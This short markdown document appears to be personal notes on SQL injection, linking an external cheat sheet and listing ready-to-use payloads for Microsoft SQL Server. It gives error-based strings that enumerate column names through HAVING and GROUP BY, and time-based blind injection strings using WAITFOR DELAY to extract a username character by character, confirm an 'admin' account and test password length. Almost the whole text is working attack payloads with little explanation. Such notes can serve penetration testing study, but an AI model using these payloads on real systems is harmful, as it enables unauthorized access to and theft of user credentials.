#### Cheat Sheat

- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

#### Blind SQL Injections

find columns names

```SQL
' HAVING 1=1 --
' GROUP BY table.column1 HAVING 1=1 --
' GROUP BY table.column1, column2 HAVING 1=1 --
' GROUP BY table.column1, column2, column3(n) HAVING 1=1 -- and so on
```

use the waiting time to determine whether the conditional equation is valid.

```SQL
-- e.g. guess username (ASCII)
'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on

-- e.g. confirm username is correct
'; IF (substring((select TOP 1 username from users), 1, 5) = 'admin') WAITFOR DELAY '00:00:05'--
```

```SQL
-- check column length
'; IF (select LEN(password) from users) = 64 WAITFOR DELAY '00:00:05' --
```
